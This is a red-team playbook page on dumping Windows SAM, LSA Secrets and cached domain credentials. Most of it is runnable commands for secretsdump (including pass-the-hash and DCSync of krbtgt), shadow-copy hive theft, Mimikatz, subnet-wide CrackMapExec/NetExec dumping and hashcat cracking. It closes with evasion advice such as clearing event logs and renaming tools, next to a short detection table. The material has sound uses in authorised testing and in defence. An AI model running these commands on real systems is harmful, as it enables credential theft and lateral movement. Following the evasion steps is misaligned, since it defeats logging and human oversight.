# SAM & LSA Secrets Extraction

> **MITRE ATT&CK**: Credential Access > T1003.002 / T1003.004 - OS Credential Dumping: SAM / LSA Secrets
> **Platforms**: Windows
> **Required Privileges**: SYSTEM / Local Administrator
> **OPSEC Risk**: Medium

## Strategic Overview

The SAM database and LSA Secrets represent the local credential stores on every Windows host.
While LSASS dumping captures credentials of currently logged-on users, SAM/LSA extraction
gives you every local account hash and service account password stored on the machine.

**As a Red Team Lead, prioritize this technique when:**
- You need local admin hashes for password reuse / spraying across the environment
- Service accounts are running with domain credentials (stored in LSA Secrets)
- You want to avoid the high-OPSEC-risk of LSASS dumping
- Extracting cached domain credentials (DCC2) for offline cracking
- Performing offline extraction from disk images or backups

**What each store contains:**
- **SAM**: Local user account NTLM hashes (Administrator, service accounts, etc.)
- **LSA Secrets**: Service account plaintext passwords, autologon credentials, DPAPI keys, VPN passwords, scheduled task credentials, machine account password
- **SECURITY (Cached Credentials)**: DCC2/mscash2 hashes of last 10 domain logons (by default)

## Technical Deep-Dive

### 1. Registry Extraction (Offline Method)

```cmd
# Save registry hives (requires Admin/SYSTEM)
reg save HKLM\SAM C:\temp\sam.bak
reg save HKLM\SYSTEM C:\temp\system.bak
reg save HKLM\SECURITY C:\temp\security.bak

# Parse offline with Impacket secretsdump
secretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL

# Output format:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# [*] Dumping LSA Secrets
# [*] $MACHINE.ACC: domain\COMPUTER$:plain_text_machine_password
# [*] DPAPI_SYSTEM: dpapi_machinekey:dpapi_userkey
# [*] NL$KM: cached_cred_encryption_key
# [*] Dumping cached domain logon information (domain/username:hash)
```

### 2. Remote Extraction with Impacket secretsdump

```bash
# Remote dump via SMB (creates temporary service, extracts, cleans up)
secretsdump.py domain.local/admin:Password123@10.10.10.5

# With pass-the-hash
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/admin@10.10.10.5

# Dump only specific stores
secretsdump.py domain.local/admin:Password123@10.10.10.5 -just-dc-user krbtgt  # DCSync single user
secretsdump.py domain.local/admin:Password123@10.10.10.5 -sam                   # SAM only
secretsdump.py domain.local/admin:Password123@10.10.10.5 -lsa                   # LSA Secrets only

# Using Kerberos authentication
secretsdump.py -k -no-pass domain.local/admin@dc01.domain.local
```

### 3. Volume Shadow Copy Method

```cmd
# Create a shadow copy
vssadmin create shadow /for=C:

# List shadow copies to get the path
vssadmin list shadows

# Copy SAM and SYSTEM from the shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\security.bak

# WMI-based shadow copy creation (alternative)
wmic shadowcopy call create Volume='C:\'

# Delete shadow copy to clean up
vssadmin delete shadows /shadow={GUID} /quiet
```

### 4. Mimikatz

```
# Dump SAM database
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Dump LSA Secrets
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# Dump Cached Domain Credentials
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit"

# Dump from offline registry hives
mimikatz.exe "lsadump::sam /sam:C:\temp\sam.bak /system:C:\temp\system.bak" "exit"
```

### 5. CrackMapExec / NetExec

```bash
# Dump SAM hashes
crackmapexec smb 10.10.10.5 -u admin -p 'Password123' --sam

# Dump LSA Secrets
crackmapexec smb 10.10.10.5 -u admin -p 'Password123' --lsa

# Dump across multiple targets
crackmapexec smb 10.10.10.0/24 -u admin -p 'Password123' --sam

# Using NetExec (CrackMapExec successor)
nxc smb 10.10.10.5 -u admin -p 'Password123' --sam
nxc smb 10.10.10.5 -u admin -p 'Password123' --lsa
```

### 6. PowerShell / .NET Methods

```powershell
# Invoke-Mimikatz (PowerSploit)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# DSInternals module for offline SAM parsing
Install-Module DSInternals -Force
$key = Get-BootKey -SystemHivePath 'C:\temp\system.bak'
Get-SAMRDatabase -DatabasePath 'C:\temp\sam.bak' -BootKey $key
```

### Understanding LSA Secrets

```
# Common LSA Secret names and what they contain:
_SC_<ServiceName>       # Service account password (plaintext!)
DefaultPassword         # Autologon password
DPAPI_SYSTEM            # DPAPI machine master key backup
NL$KM                   # Cached credential encryption key
$MACHINE.ACC            # Machine account password (used for NTLM/Kerberos)
L$_RasDefaultCredentials # VPN saved credentials
L$<other>               # Various application-stored secrets
```

### Cached Credentials (DCC2)

```
# Cached credentials are stored as DCC2/mscash2 hashes
# Default: Last 10 domain logons cached
# Registry: HKLM\Security\Cache -> NL$1 through NL$10

# Check cached credential count
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount

# DCC2 format for Hashcat:
# $DCC2$10240#username#hash
# Hashcat mode: 2100
hashcat -m 2100 dcc2_hashes.txt wordlist.txt

# DCC2 is intentionally slow to crack (~10x slower than NTLM)
# Prioritize other credential sources first
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| Registry hive access | Sysmon Event ID 1 | reg save HKLM\SAM command |
| Shadow copy creation | Event ID 8222, Sysmon ID 1 | vssadmin or wmic shadow commands |
| Remote service creation | Event ID 7045 | secretsdump creates RemComSvc |
| SAM file access | Sysmon Event ID 11 | File creation of SAM/SYSTEM copies |
| Sensitive privilege use | Event ID 4673 | SeTakeOwnershipPrivilege, SeDebugPrivilege |

### Evasion Techniques

1. **Use Volume Shadow Copies** - Avoids direct registry access logging
2. **In-memory parsing** - Tools like SafetyKatz parse without writing to disk
3. **Clean up artifacts** - Delete shadow copies, remove temp files, clear event logs
4. **Use existing admin sessions** - Avoid creating new logon events
5. **Target off-hours** - Reduce detection likelihood during maintenance windows
6. **Rename tools** - Rename procdump/mimikatz to avoid filename-based detection

## Cross-References

- [LSASS Dumping](lsass-dumping.md) - Extract credentials from running sessions
- [DCSync](dcsync.md) - Domain-wide credential extraction
- [Password Cracking](password-cracking.md) - Crack extracted DCC2 and NTLM hashes
- [DPAPI Abuse](dpapi-abuse.md) - Use extracted DPAPI keys to decrypt user data
- ../06-lateral-movement/ - Use extracted hashes for pass-the-hash

## References

- https://attack.mitre.org/techniques/T1003/002/
- https://attack.mitre.org/techniques/T1003/004/
- https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
- https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-lsa-secrets
- https://adsecurity.org/?p=1729
